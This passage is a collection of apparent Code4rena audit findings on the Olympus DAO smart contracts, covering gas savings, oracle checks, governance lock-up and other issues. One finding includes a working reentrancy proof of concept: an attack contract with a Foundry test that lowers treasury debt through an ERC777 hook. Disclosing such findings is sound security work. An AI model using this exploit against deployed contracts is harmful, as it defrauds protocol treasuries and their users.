onlyRole("custodian") {  47         TRSRY.setApprovalFor(for_, token_, amount_);  48     } ```   ## Tools Used  none  ## Recommended Mitigation Steps  Instead of setting the given amount, one can reduce from the current approval. By doing so, it checks whether the previous approval is spend.  <!-- zzzitron M06 -->    
# Lines of code  https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/TRSRY.sol#L105-L112 https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L330   # Vulnerability details  ## Impact  One can repay loan to the treasury with the value from the Operator::swap  Condition:   - the reserve token in Operator has hook for sender (like ERC777)   - the debt is the same token as reserve  ## Proof of Concept   The below code snippet shows a part of proof of concept for reentrancy attack, which is based on `src/test/policies/Operator.t.sol`. The full test code can be found [here](https://gist.github.com/zzzitron/651e1451ac1ff21be8a72b502b26f7cb), and [git diff from the `Operator.t.sol`](https://gist.github.com/zzzitron/5b8ebe635ed1939f18a100c7940b4f11).  Let's say that the reserve token implements ERC777 with the hook for the sender [(see weird erc20)](https://github.com/d-xo/weird-erc20#reentrant-calls). If the attacker can take debt of the reserve currency for the attack contract `Reenterer`, the contract can call `OlympusTreasury::repayLoan` and in the middle of repay call `Operator::swap` function. The `swap` function will modify the reserve token balance of treasury and the amount the attacker swapped will be also be used for the `repayLoan`.  In the below example, the attacker has debt of 1e18, and repays 1e17. But since the `swap` function is called in the `repayLoan`, the debt is reduced 1e17 more then it should. And the swap happened as expected so the attack has the corresponding ohm token.  ```solidity /// Mock to simulate the senders hook /// for simplicity omitted the certain aspects like ERC1820 registry and etc. contract MockERC777 is MockERC20 {     constructor () MockERC20("ERC777", "777", 18) {}      function transferFrom(address from, address to, uint256 amount) public override returns (bool) {         _callTokenToSend(from, to, amount);         return super.transferFrom(from, to, amount);         // _callTokenReceived(from, to, amount);     }      // simplified implementation for ERC777     function _callTokenToSend(address from, address to, uint256 amount) private {       if (from != address(0)) {         IERC777Sender(from).tokensToSend(from, to, amount);       }     } }  interface IERC777Sender {   function tokensToSend(address from, address to, uint256 amount) external; }  /// Concept for an attack contract contract Reenterer is IERC777Sender {   ERC20 public token;   Operator public operator;   bool public entered;    constructor(address token_, Operator op_) {     token = ERC20(token_);     operator = op_;   }    function tokensToSend(address from, address to, uint256 amount) external override {     if (!entered) {     // call swap from reenter     // which will manipulate the balance of treasury       entered = true;       operator.swap(token, 1e17, 0);     }   }      function attack(OlympusTreasury treasury) public {     // approve to the treasury     token.approve(address(treasury), 1e18);     token.approve(address(operator), 100* 1e18);      // repayDebt of 1e17     treasury.repayLoan(token, 1e17);   } } ```  ```solidity /// the test     function test_poc__reenter() public {         vm.prank(guardian);         operator.initialize();        reserve.mint(address(reenterer), 1e18);       assertEq(treasury.reserveDebt(reserve, address(reenterer)), 1e18);       // start repayLoan       reenterer.attack(treasury);       // it should be 9 * 1e17 but it is 8 * 1e17       assertEq(treasury.reserveDebt(reserve, address(reenterer)), 8*1e17);     } ```  ## Cause  The `repayLoan`, in the line 110 below,  calls the `safeTransferFrom`. The balance before and after are compared to determine how much of debt is paid. So, if the `safeTranferFrom` can modify the balance, the attacker can profit from it.  ```solidity // OlympusTreasury::repayLoan // https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/TRSRY.sol#L105-L112 105     function repayLoan(ERC20 token_, uint256 amount_) external nonReentrant { 106         if (reserveDebt[token_][msg.sender] == 0) revert TRSRY_NoDebtOutstanding(); 107 108         // Deposit from caller first (to handle nonstandard token transfers) 109         uint256 prevBalance = token_.balanceOf(address(this)); 110         token_.safeTransferFrom(msg.sender, address(this), amount_); 111 112         uint256 received = token_.balanceOf(address(this)) - prevBalance; ```  In the `swap` function, if the amount in token is reserve, the payment token to buy ohm will be paid to the treasury. It gives to an opportunity to modify the balance.  ```solidity // Operator::swap // https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L330 329             /// Transfer reserves to treasury 330             reserve.safeTransferFrom(msg.sender, address(TRSRY), amountIn_); ```  Although both of `Operator::swap` and `OlympusTreasury::repayLoan` have `nonReentrant` modifier, it does not prevent as they are two different contracts.  ## Tools Used  foundry  ## Recommended Mitigation Steps  The deposit logic in the `OlympusTreasury::repayLoan` was trying to handle nonstandard tokens, such as fee-on-transfer. But by doing so introduced an attack vector for tokens with ERC777. If the reserve token should be decided in the governance, it should be clarified, which token standards can be used safely.   <!-- zzzitron M00 -->    
 ## <X> += <Y> COSTS MORE GAS THAN <x> = <X> + <Y> FOR STATE VARIABLES https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L194 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L198 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L252 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L254 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Heart.sol#L103 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/BondCallback.sol#L143 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/BondCallback.sol#L144 https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L222 https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L136 https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L138   ## FOR LOOPS CAN BE MORE EFFICIENT  To optimize the for loop and make it consume less gas, i suggest to:  1. If a variable is not set/initialized, it is assumed to have the default value (0 for uint, false for bool, address(0) for address…). Explicitly initializing it with its default value is an anti-pattern and wastes gas.   2. Reading array length at each iteration of the loop takes 6 gas (3 for mload and 3 to place memory_offset) in the stack.  Caching the array length in the stack saves around 3 gas per iteration. I suggest storing the array’s length in a variable before the for-loop.  https://github.com/code-423n4/2022-08-olympus/blob/main/src/utils/KernelUtils.sol#L43 https://github.com/code-423n4/2022-08-olympus/blob/main/src/utils/KernelUtils.sol#L58  ```for (uint256 i = 0; i < 32; ) {```  Actually this solution is already done in other contracts, so i suggest to change the line code above.
1)It costs more gas to initialize variables to zero than to let the default of zero be applied  If a variable is not set/initialized, it is assumed to have the default value (0 for uint, false for bool, address(0) for address…). Explicitly initializing it with its default value is an anti-pattern and wastes gas.  As an example: for (uint256 i = 0; i < numIterations; ++i) { should be replaced with for (uint256 i; i < numIterations; ++i) {      File: 2022-08-olympus\src\Kernel.sol   397,14:         for (uint256 i = 0; i < reqLength; ) {  File: 2022-08-olympus\src\utils\KernelUtils.sol   43,10:     for (uint256 i = 0; i < 5; ) {   58,10:     for (uint256 i = 0; i < 32; ) {   2)<ARRAY>.LENGTH SHOULD NOT BE LOOKED UP IN EVERY LOOP OF A FOR-LOOP The overheads outlined below are PER LOOP,   storage arrays incur a Gwarmaccess (100 gas) memory arrays use MLOAD (3 gas) calldata arrays use CALLDATALOAD (3 gas) Caching the length changes each of these to a DUP<N> (3 gas), and gets rid of the extra DUP<N> needed to store the stack offset     File: 2022-08-olympus\src\policies\Governance.sol     278,47:         for (uint256 step; step < instructions.length; ) {   3)Using private rather than public for constants, saves gas  If needed, the value can be read from the verified contract source code. Savings are due to the compiler not having to create non-payable getter functions for deployment calldata, and not adding another entry to the method ID table  File: 2022-08-olympus\src\modules\PRICE.sol   59,11:     uint8 public constant decimals = 18;     File: 2022-08-olympus\src\modules\RANGE.sol   65,13:     uint256 public constant FACTOR_SCALE = 1e4;  File: 2022-08-olympus\src\policies\Governance.sol   121,13:     uint256 public constant SUBMISSION_REQUIREMENT = 100;   124,13:     uint256 public constant ACTIVATION_DEADLINE = 2 weeks;   127,13:     uint256 public constant GRACE_PERIOD = 1 weeks;   130,13:     uint256 public constant ENDORSEMENT_THRESHOLD = 20;   133,13:     uint256 public constant EXECUTION_THRESHOLD = 33;   137,13:     uint256 public constant EXECUTION_TIMELOCK = 3 days;  File: 2022-08-olympus\src\policies\Operator.sol   89,12:     uint32 public constant FACTOR_SCALE = 1e4;    4)X = X + Y IS CHEAPER THAN X += Y      File: 2022-08-olympus\src\modules\PRICE.sol   136,28:             _movingAverage += (currentPrice - earliestPrice) / numObs;   222,19:             total += startObservations_[i];  File: 2022-08-olympus\src\modules\TRSRY.sol   96,41:         reserveDebt[token_][msg.sender] += amount_;   97,27:         totalDebt[token_] += amount_;   131,50:         if (oldDebt < amount_) totalDebt[token_] += amount_ - oldDebt;  File: 2022-08-olympus\src\modules\VOTES.sol   58,28:             balanceOf[to_] += amount_;  File: 2022-08-olympus\src\policies\BondCallback.sol   143,35:         _amountsPerMarket[id_][0] += inputAmount_;   144,35:         _amountsPerMarket[id_][1] += outputAmount_;  File: 2022-08-olympus\src\policies\Governance.sol   198,51:         totalEndorsementsForProposal[proposalId_] += userVotes;   252,60:             yesVotesForProposal[activeProposal.proposalId] += userVotes;   254,59:             noVotesForProposal[activeProposal.proposalId] += userVotes;  File: 2022-08-olympus\src\policies\Heart.sol   103,18:         lastBeat += frequency();            
# Lines of code  https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L165-L171   # Vulnerability details  ## Impact Price oracle may fail and revert due to the inconsistency in the staleness checks.   ## Proof of Concept  In the `getCurrentPrice()` of `PRICE.sol`, Chainlink oracles are used to get the price of OHM against a reserve token, and a staleness check is used to make sure the price oracles are reporting fresh data. Yet the freshness requirements are inconsistent, for OHM, `updatedAt` should be lower than current timestamp minus three times the observation frequency, while for the reserve price, it is required that `updatedAt` should be lower than current timestamp minus the observation frequency. Our understanding is that that frequency is multiplied by 3 so that there can be some meaningful room where price data is accepted, as the time frame of only observation frequency (multiplied by 1) may not be enough for the oracle to realistically update its data.  (In other words, the frequency of new price information might be lower than the observation frequency, which is probably the case as third multiple is used for the OHM price).  If this is the case, this inconsistency may lead to the `getCurrentPrice()` reverting as while third multiple of the observation frequency might give enough space for the first oracle, second oracle's first multiple of frequency time frame might not be enough and it couldn't pass the staleness check due to unrealistic expectation of freshness.   ## Tools Used Manual review, talking with devs  ## Recommended Mitigation Steps Change the line 171 to  ```             if (updatedAt < block.timestamp - 3 * uint256(observationFrequency)) ``` like line 165. 
# Low Risk and Non-Critical Issues  ## Low Risk ##  ### [L-01]: Missing check ###  **Context:**  https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/PRICE.sol#L79  **Description:**  Missing check that observationFrequency_ not equal to zero.  For example, there is a check that observationFrequency_ not equal to zero [here](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/PRICE.sol#L268).   Constructor will not indicate Price_InvalidParams() error without that check.  **Recommendation:**  Change to:   ``` if (observationFrequency_ == 0 || movingAverageDuration_ == 0 || movingAverageDuration_ % observationFrequency_ != 0) ```  ## Non-Critical Issues ##  ### [N-01]: Constants instead of unknown variables ### **Context:**   + https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/utils/KernelUtils.sol#L43 (5)  + https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/utils/KernelUtils.sol#L58 (32)  + https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/PRICE.sol#L90 (38)  + https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/RANGE.sol#L245 (10000)  + https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/RANGE.sol#L246 (100)  + https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/RANGE.sol#L247 (10000)  + https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/RANGE.sol#L248 (100)  + https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/RANGE.sol#L264 (10000 and 100)  + https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L164 (10000)  + https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L217 (100)  + https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L268 (100)  + https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L106 (10_000)  + https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L111 (10000 and 100)  + https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L518 (10000 and 100)  + https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L535 (10_000)  + https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L550 (10000 and 100)   **Description:**  Use constant variables to make the code easier to understand and maintain.  **Recommendation:**  Define constants instead of unknown variables.   ### [N-02]: Public function can be external ### **Context:**   + https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L439  + https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L451  + https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L47  + https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L75  + https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/MINTR.sol#L20  + https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/MINTR.sol#L33  + https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/MINTR.sol#L37  + https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol#L110  + https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol#L215  + https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L108  + https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/VOTES.sol#L22  + https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/VOTES.sol#L45  + https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/INSTR.sol#L28    **Description:**  Public functions can be declared external if they are not called by the contract.  **Recommendation:**  Declare these functions as external instead of public. 
# Report ## Gas Optimizations ##  ### [G-01]: Use new variable instead of reading array length in every loop of a for-loop ### **Context:**  https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L278   **Description:**  If you read the length of the array at each iteration of the loop, this consumes a lot of gas.   **Recommendation:**  Store the array’s length in a variable before the for-loop, and use this new variable in the loop.   ### [G-02]: variable can be immutable ###  **Context:**  https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/BondCallback.sol#L32   **Description:**  Variable is set in the constructor and never modified after that.  **Recommendation:**  It is more gas efficient to mark it as immutable.   ### [G-03]: X += Y costs more gas than X = X + Y ### **Context: **   + https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L96  + https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L97    + https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L131    + https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L115    + https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L116    + https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L132    + https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L136    + https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L222    + https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L138    + https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/VOTES.sol#L58    + https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/VOTES.sol#L56    + https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/BondCallback.sol#L143    + https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/BondCallback.sol#L144    + https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Heart.sol#L103    + https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L198    + https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L252  + https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L254    + https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L194  **Recommendation:**  Change X += Y (X -= Y) to X = X + Y (X = X - Y).   ### [G-04]: i++ costs more gas than ++i ### **Context:**   + https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L488  + https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L670  + https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L686  + https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L691   **Recommendation:**  Change i++ (i--) to ++i (--i).  ### [G-05]: Don't initialize variable with its default value ### **Context:**   + https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/Kernel.sol#L397  + https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/utils/KernelUtils.sol#L43  + https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/utils/KernelUtils.sol#L58  **Description:**  Default value of uint is 0. It's unnecessary and costs more gas to initialize uint variavles to 0.  **Recommendation:**  Change uint256 i = 0; to uint256 i;   ### [G-06]: >0 costs more gas than !=0 ### **Context:**   https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L247  **Description:**  uint256 is a unsigned integer.   userVotesForProposal[activeProposal.proposalId][msg.sender] will never be less than 0.  **Recommendation:**  Change to  ``` if (userVotesForProposal[activeProposal.proposalId][msg.sender] != 0) { ```
# Lines of code  https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Heart.sol#L110-L115   # Vulnerability details  Rewards for Heart `beat` are sent via `_issueReward`  https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Heart.sol#L110-L115  ```solidity      function _issueReward(address to_) internal {         rewardToken.safeTransfer(to_, reward);         emit RewardIssued(to_, reward);     }  ```  The function doesn't check for available tokens e.g. `min(reward, rewardToken.balanceOf(address(this)));`   In case of calling `withdrawUnspentRewards`  https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Heart.sol#L149-L152  ```solidity     /// @inheritdoc IHeart     function withdrawUnspentRewards(ERC20 token_) external onlyRole("heart_admin") {         token_.safeTransfer(msg.sender, token_.balanceOf(address(this)));     } ```  Because the function withdraws the entire amount, the heart will stop until a caller incentive is deposited again.  While a profitable searches will stop calling the Heart without an incentive, allowing the heart to beat when no rewards are available is preferable to having it self-DOS until a DAO aligned caller donates `rewardToken` or the DAO deals with the lack of tokens.  ## Remediation  Add a check for available tokens `min(reward, rewardToken.balanceOf(address(this)));`
# Executive Summary  Codebase is gas conscious and basic gas saving advice is followed pretty thoroughly, below are listed a few extra optimizations, sorted by efficacy  ## Optimized `updateMovingAverage` - 200+ gas saved per function call  https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/PRICE.sol#L133-L145  ```solidity          // Calculate new moving average         if (currentPrice > earliestPrice) {             _movingAverage += (currentPrice - earliestPrice) / numObs;         } else {             _movingAverage -= (earliestPrice - currentPrice) / numObs;         }          // Push new observation into storage and store timestamp taken at         observations[nextObsIndex] = currentPrice;         lastObservationTime = uint48(block.timestamp);         nextObsIndex = (nextObsIndex + 1) % numObs;  ```  Can be changed to  ```solidity          // Calculate new moving average          /// @audit Use unchecked as you already checked for overflow         unchecked {           if (currentPrice > earliestPrice) {               _movingAverage += (currentPrice - earliestPrice) / numObs;           } else {               _movingAverage -= (earliestPrice - currentPrice) / numObs;           }            // Push new observation into storage and store timestamp taken at           /// @audit also unchecked addition           /// @audit Cache the value of `nextObsIndex` to save an SLOAD           uint32 cachedNextObsIndex = nextObsIndex;           observations[cachedNextObsIndex] = currentPrice;           lastObservationTime = uint48(block.timestamp);           nextObsIndex = (cachedNextObsIndex + 1) % numObs;         }  ```  ## Avoidable Second STATICCALL - 100+ gas  https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/Kernel.sol#L238-L239  ```solidity             ensureValidKeycode(Module(target_).KEYCODE());  ```  Can instead cache keycode = Module(target_).KEYCODE(); and pass it to the next function `_installModule(target_, keycode);  Saving over 100 gas (STATICCALL + cost of processing the string for the return value)  ## Cache Storage Var - Save 100 gas  https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/PRICE.sol#L165-L166  ```solidity             if (updatedAt < block.timestamp - 3 * uint256(observationFrequency))  ```  Cache the value of `observationFrequency` to save 100 gas  ## Free Unchecked - 80+ gas  You can wrap the code below in unchecked to gain around 80 gas;  https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/INSTR.sol#L44-L45  ```solidity         uint256 instructionsId = ++totalInstructions;  ```   # Usual Suspects  ## Cache length - 3 gas  https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L278-L279  ```solidity         for (uint256 step; step < instructions.length; ) {  ```
# Lines of code  https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L216-L221 https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L302-L304   # Vulnerability details  ## Impact Currently, if users vote for the active proposal, the `VOTES` are transferred to the contract so that users can't vote or endorse other proposals while the voted proposal is active.  And the active proposal can be replaced only when the proposal is executed successfully or another proposal is activated after `GRACE_PERIOD`.  But `activateProposal()` requires at least 20% endorsements [here](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L216-L221), so it might be impossible to activate a new proposal forever if the current active proposal involves more than 80% of total votes.   ## Proof of Concept The below scenario would be possible. 1. `Proposal 1` was submitted and activated successfully. 2. Let's assume 81% of the total votes voted for this proposal. `Yes = 47%`, `No = 34%` 3. This proposal can't be executed for [this requirement](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L268-L270) because `47% - 34% = 13% < 33%`. 4. Currently the contract contains more than 81% of total votes and users have at most 19% in total. 5. Also users can't reclaim their votes among 81% while `Proposal 1` is active. 6. So even if a user who has 1% votes submits a new proposal, it's impossible to activate because of this [require()](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L216-L221). 7. So it's impossible to delete `Proposal 1` from an active proposal and there won't be other active proposal forever.   ## Tools Used Solidity Visual Developer of VSCode   ## Recommended Mitigation Steps I think we should add one more constant like `EXECUTION_EXPIRE = 2 weeks` so that voters can reclaim their votes after this period even if the proposal is active.  I am not sure we can use the current `GRACE_PERIOD` for that purpose.  So `reclaimVotes()` should be modified like below.  ``` function reclaimVotes(uint256 proposalId_) external {     uint256 userVotes = userVotesForProposal[proposalId_][msg.sender];      if (userVotes == 0) {         revert CannotReclaimZeroVotes();     }      if (proposalId_ == activeProposal.proposalId) {         if (block.timestamp < activeProposal.activationTimestamp + EXECUTION_EXPIRE) //+++++++++++++++++++++++++++++++++         {             revert CannotReclaimTokensForActiveVote();         }     }      if (tokenClaimsForProposal[proposalId_][msg.sender] == true) {         revert VotingTokensAlreadyReclaimed();     }      tokenClaimsForProposal[proposalId_][msg.sender] = true;      VOTES.transferFrom(address(this), msg.sender, userVotes); } ```
# Executive Summary  The idea of Modules and Policies is brilliant!  Most of the codebase is well written and well thought out, the one exception to me was Governance which I don't believe will withstand an adversarial environment.  Minor Code smells are listed below rated via the following standard  ## Legend:  - L -> Low Severity -> Could cause issues however impact / probability is limited - R -> Refactoring -> Suggested Code Change to improve readability and maintainability or to offer better User Experience - NC -> Non-Critical / Informational -> No risk of loss, pertains to events or has no impact  ## L - Burning `VOTES` from Governance will break accounting  While burning `VOTES` from the `Governance` contract is questionable, the code has no check to prevent that.  https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/VOTES.sol#L38-L42  ```solidity      function burnFrom(address wallet_, uint256 amount_) external permissioned {         _burn(wallet_, amount_);     }  ```  Because `Governance` and `VOTES.transferFrom` relies on a "use -> refund" pattern, losing even 1 wei of token will cause `reclaimVotes` to revert, effectively denying a user from being able to vote again.  Voting can be denied by simply burning their `VOTES` hence why I set the severity to Low as this is a Ban with extra steps as the `voter_admin` can just burn the votes from the user  ## L - Allow others to repay the debt  `repayLoan` allows only the caller to repay their own debt, this can create situations in which insolvency or a smart contract bug prevent from making the TRSRY whole.  A straightforward solution would be to allow anyone to repay the loan on behalf of a specific address  https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/TRSRY.sol#L103-L110  ```solidity      /// @notice Lets an address with debt repay their loan.     function repayLoan(ERC20 token_, uint256 amount_) external nonReentrant {         if (reserveDebt[token_][msg.sender] == 0) revert TRSRY_NoDebtOutstanding();          // Deposit from caller first (to handle nonstandard token transfers)         uint256 prevBalance = token_.balanceOf(address(this));         token_.safeTransferFrom(msg.sender, address(this), amount_); ```   By allowing other addresses a softer approach to repaying debt can be achieved.  This avoids having to manually reset the debt.   ## L - `_activatePolicy` is non CEI conformant  The function `_activatePolicy` will perform an external call to `policy_.configureDependencies()` and then it will change storage.  https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/Kernel.sol#L298-L315  ```solidity         // Add policy to list of active policies         activePolicies.push(policy_);         getPolicyIndex[policy_] = activePolicies.length - 1;          // Record module dependencies         Keycode[] memory dependencies = policy_.configureDependencies();         uint256 depLength = dependencies.length;          for (uint256 i; i < depLength; ) {             Keycode keycode = dependencies[i];              moduleDependents[keycode].push(policy_);             getDependentIndex[keycode][policy_] = moduleDependents[keycode].length - 1;              unchecked {                 ++i;             }         } ```  I wasn't able to find any exploit as the function is privileged  ## R - `get` for a state changing function  `getXyz` is typically used for retrieving values from view functions, however in the case of `TRSRY` the function is used to receive a loan.  Because the codebase already uses `get` for view functions, I'd recommend renaming the function below to `receiveLoan` or just `loan` to keep the coding convention  https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/TRSRY.sol#L92-L93  ```solidity     function getLoan(ERC20 token_, uint256 amount_) external permissioned {  ```   ## R - Can check contract existence without assembly  https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/utils/KernelUtils.sol#L31-L37  ```solidity function ensureContract(address target_) view {     uint256 size;     assembly {         size := extcodesize(target_)     }     if (size == 0) revert TargetNotAContract(target_); } ```  Can be changed to ```solidity target_.code.length ```   ## Lack of Address(0) Zero-Checks  https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/Kernel.sol#L66-L67  https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/Kernel.sol#L77-L78   ## NC - Lack of event for setters  Throughout the codebase, most setters emit events, however `setActiveStatus` doesn't  https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/Kernel.sol#L127-L128  ```solidity         isActive = activate_;  ```  https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/Kernel.sol#L77-L78  ## NC - Events not emitted in constructor  While setters emit events, the constructor doesn't, this may cause issues with tracking, e.g. theGraph as an event is for the initial setting is not emitted   https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/Kernel.sol#L217-L220  ```solidity     constructor() {         executor = msg.sender;         admin = msg.sender;     } ```  ## NC - Gibberish action will still emit an event  You may instead want to emit only when a valid action is executed Or add a comment to the function mentioning that  As it stands the code will emit even if the action data is not recognized  https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/Kernel.sol#L259-L260  ```solidity         emit ActionExecuted(action_, target_);  ```
# Lines of code  https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L325   # Vulnerability details  ## Impact There are no checks to ascertain that the policy being removed is registered in the `Kernel`. Trying to remove a non-registered results in the policy registered at 0th index of `activePolicies` being removed.   ## Proof of Concept https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L325  ## Recommended Mitigation Steps Adding `require(activePolicies[idx] == policy_, "Unregistered policy");` will prevent this, where `idx = getPolicyIndex[policy_]`.  **NOTE:** The issue is less likely to happen as this is handled solely by the executor, but having safeguards in the contract is always better than relying on an external factor. 
